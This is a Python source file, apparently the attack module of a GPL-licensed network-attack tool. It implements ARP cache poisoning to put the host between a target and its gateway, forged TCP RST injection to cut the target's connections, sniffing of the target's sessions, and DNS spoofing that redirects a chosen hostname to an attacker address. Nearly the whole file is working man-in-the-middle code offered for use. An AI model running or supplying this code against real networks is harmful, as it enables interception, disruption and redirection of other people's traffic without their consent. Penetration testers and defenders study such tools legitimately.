# Copyright (c) 2014-2016 Andrea Baldan
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA

try:
    import dnet
except ImportError:
    print("[!] Missing module dnet, DNS spoofing (-2 options) won't work")

import pcap
import dpkt
import time
import signal
from threading import Thread
from socket import socket, inet_ntoa, gethostbyname, PF_PACKET, SOCK_RAW
import core.utils as utils
import core.config as config
# from socket import *

(G, W, R) = (utils.G, utils.W, utils.R)

def rearp(dev, source, target):
    """ reset arp cache of the target and the router (AP) """
    target_mac = utils.get_mac_byip(target)
    source_mac = utils.get_mac_byip(source)
    sock = socket(PF_PACKET, SOCK_RAW)
    sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
    for i in xrange(6):
        try:
            sock.send(str(build_arp_packet(target_mac, source, target)))
            sock.send(str(build_arp_packet(source_mac, target, source)))
        except:
            pass


def poison(dev, source_mac, source, target, delay=4):
    """
    poison arp cache of target and router, causing all traffic between them to
    pass inside our machine, MITM heart
    """
    utils.set_ip_forward(1)
    sock = socket(PF_PACKET, SOCK_RAW)
    sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
    try:
        while True:
            if config.VERBOSE is True:
                print("[+] {0} <-- {1} -- {2} -- {3} --> {4}".format(source, target, dev, source, target))
            try:
                sock.send(str(build_arp_packet(source_mac, source, target)))
                sock.send(str(build_arp_packet(source_mac, target, source)))
                time.sleep(delay) # OS refresh ARP cache really often
            except:
                pass
    except KeyboardInterrupt:
        print('\n\r[+] Poisoning interrupted')
        sock.close()

def build_pcap_filter(target, **kwargs):
    """
    build a pcap filter based on **kwargs received
    """
    if not kwargs:
        return "ip host %s" % target
    elif kwargs['port']:
        return "ip host %s and tcp port %s" % target, kwargs['port']

def rst_inject(dev, source_mac, source, target, **kwargs):
    """
    injecting RESET packets to the target machine eventually blocking his
    connection and navigation
    """
    sock = socket(PF_PACKET, SOCK_RAW)
    sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
    pcap_filter = build_pcap_filter(target, **kwargs)
    # need to create a daemon that continually poison our target
    thread = Thread(target=poison, args=(dev, source_mac, source, target,))
    thread.daemon = True
    thread.start()
    # start capturing packets
    pc = pcap.pcap(dev)
    pc.setfilter(pcap_filter) # we need only target packets
    print('[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W
          + ' and ' + R + target + W)

    if kwargs['port']:
        print('[+] Sending RST packets to ' + R + target + W + ' on port ' + R + kwargs['port'] + W)
    else:
        print('[+] Sending RST packets to ' + R + target + W)

    if config.DOTTED is True:
        print('[+] Every dot symbolize a sent packet')

    counter = 0
    try:
        for ts, pkt in pc:
            eth = dpkt.ethernet.Ethernet(pkt)
            ip = eth.data
            if ip.p == dpkt.ip.IP_PROTO_TCP:
                tcp = ip.data
                if tcp.flags != dpkt.tcp.TH_RST:
                    # build tcp layer
                    recv_tcp = dpkt.tcp.TCP(
                        sport=tcp.sport,
                        dport=tcp.dport,
                        seq=tcp.seq + len(tcp.data),
                        ack=0,
                        off_x2=0x50,
                        flags=dpkt.tcp.TH_RST,
                        win=tcp.win,
                        sum=0,
                        urp=0)
                    # build ip layer
                    recv_ip = dpkt.ip.IP(
                        v_hl=ip.v_hl,
                        tos=ip.tos,
                        len=40,
                        id=ip.id + 1,
                        off=0x4000,
                        ttl=128,
                        p=ip.p,
                        sum=0,
                        src=ip.src,
                        dst=ip.dst,
                        data=recv_tcp)
                    # build ethernet layer
                    recv_eth = dpkt.ethernet.Ethernet(
                        dst=eth.dst,
                        src=eth.src,
                        type=eth.type,
                        data=recv_ip)

                    sock.send(str(recv_eth))

                    if config.DOTTED is True:
                        utils.print_in_line('.')
                    else:
                        utils.print_counter(counter)

                    ip.src, ip.dst = ip.dst, ip.src
                    # build tcp layer
                    send_tcp = dpkt.tcp.TCP(
                        sport=tcp.dport,
                        dport=tcp.sport,
                        seq=tcp.ack,
                        ack=tcp.seq + len(tcp.data),
                        off_x2=0x50,
                        flags=dpkt.tcp.TH_RST,
                        win=tcp.win,
                        sum=0,
                        urp=0)
                    # build ip layer
                    send_ip = dpkt.ip.IP(
                        v_hl=ip.v_hl,
                        tos=ip.tos,
                        len=40,
                        id=ip.id + 1,
                        off=0x4000,
                        ttl=128,
                        p=ip.p,
                        sum=0,
                        src=ip.src,
                        dst=ip.dst,
                        data=send_tcp)
                    # build ethernet layer
                    send_eth = dpkt.ethernet.Ethernet(
                        dst=eth.src,
                        src=eth.dst,
                        type=eth.type,
                        data=send_ip)

                    sock.send(str(send_eth))

                    if config.DOTTED is True:
                        utils.print_in_line('.')
                    else:
                        utils.print_counter(counter)
                        counter += 1

    except KeyboardInterrupt:
        print('[+] Rst injection interrupted\n\r')
        sock.close()
        utils.set_ip_forward(0)

def get_sessions(dev, target, port=None):
    """
    Try to get all sessions on tcp of the target
    """
    notorious_services = {
        20: ' ftp-data session',
        21: ' ftp-data session',
        22: ' ssh session',
        23: ' telnet session',
        25: ' SMTP session',
        80: '\t HTTP session',
        110: ' POP3 session',
        143: ' IMAP session',
        194: ' IRC session',
        220: ' IMAPv3 session',
        443: '\t SSL session',
        445: ' SAMBA session',
        989: ' FTPS session',
        990: ' FTPS session',
        992: ' telnet SSL session',
        993: ' IMAP SSL session',
        994: ' IRC SSL session'
    }

    source = utils.get_default_gateway_linux()
    pcap_filter = 'ip host %s' % target

    if port:
        pcap_filter += ' and port %s' % port

    pc = pcap.pcap(dev)
    pc.setfilter(pcap_filter) # we need only target packets
    # need to create a daemon that continually poison our target
    thread = Thread(target=poison,
                    args=(dev, utils.parse_mac(utils.get_mac_addr(dev)), source, target,))
    thread.daemon = True
    thread.start()
    print('[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W
          + ' and ' + R + target + W)
    sessions = []
    session = 0
    sess = ""
    try:
        for ts, pkt in pc:
            eth = dpkt.ethernet.Ethernet(pkt)
            ip = eth.data
            if ip.p == dpkt.ip.IP_PROTO_TCP:
                tcp = ip.data
                if tcp.flags != dpkt.tcp.TH_RST:
                    if inet_ntoa(ip.src) == target:
                        sess = inet_ntoa(ip.src) + ":" + str(tcp.sport)
                        sess += "\t-->\t" + inet_ntoa(ip.dst) + ":" + str(tcp.dport)
                    else:
                        sess = inet_ntoa(ip.dst) + ":" + str(tcp.dport)
                        sess += "\t<--\t" + inet_ntoa(ip.src) + ":" + str(tcp.sport)

                    if sess not in sessions:
                        sessions.append(sess)
                        if tcp.sport in notorious_services:
                            sess += notorious_services[tcp.sport]
                        elif tcp.dport in notorious_services:
                            sess += notorious_services[tcp.dport]

                        print(" [{0}] {1}".format(session, sess))
                        session += 1

    except KeyboardInterrupt:
        print('[+] Session scan interrupted\n\r')

def dns_spoof(dev, source_mac, source, target=None, host=None, redirection=None):
    redirection = gethostbyname(redirection)
    sock = dnet.ip()

    pcap_filter = 'udp dst port 53'

    if target:
        pcap_filter += ' and src %s' % target

    print('[+] Start poisoning on ' + G + dev + W + ' between ' + G + source + W + ' and ' + R + target + W)
    # need to create a daemon that continually poison our target
    thread = Thread(target=poison, args=(dev, source_mac, source, target, 2, ))
    thread.daemon = True
    thread.start()

    pc = pcap.pcap(dev)
    pc.setfilter(pcap_filter)
    print('[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R + target + W)

    try:
        for ts, pkt in pc:
            eth = dpkt.ethernet.Ethernet(pkt)
            ip = eth.data
            udp = ip.data
            dns = dpkt.dns.DNS(udp.data)
            # validate query
            if dns.qr != dpkt.dns.DNS_Q:
                continue
            if dns.opcode != dpkt.dns.DNS_QUERY:
                continue
            if len(dns.qd) != 1:
                continue
            if len(dns.an) != 0:
                continue
            if len(dns.ns) != 0:
                continue
            if dns.qd[0].cls != dpkt.dns.DNS_IN:
                continue
            if dns.qd[0].type != dpkt.dns.DNS_A:
                continue

            # spoof for our target name
            if dns.qd[0].name != host:
                continue

            # dns query->response
            dns.op = dpkt.dns.DNS_RA
            dns.rcode = dpkt.dns.DNS_RCODE_NOERR
            dns.qr = dpkt.dns.DNS_R

            # construct fake answer
            arr = dpkt.dns.DNS.RR()
            arr.cls = dpkt.dns.DNS_IN
            arr.type = dpkt.dns.DNS_A
            arr.name = host
            arr.ip = dnet.addr(redirection).ip
            # arr.ip = '\x4D\xEE\xB8\x96'

            dns.an.append(arr)

            udp.sport, udp.dport = udp.dport, udp.sport
            ip.src, ip.dst = ip.dst, ip.src
            udp.data = dns
            udp.ulen = len(udp)
            ip.len = len(ip)

            print(inet_ntoa(ip.src))

            buf = dnet.ip_checksum(str(ip))
            sock.send(buf)

    except KeyboardInterrupt:
        print('[+] DNS spoofing interrupted\n\r')
        utils.set_ip_forward(0)
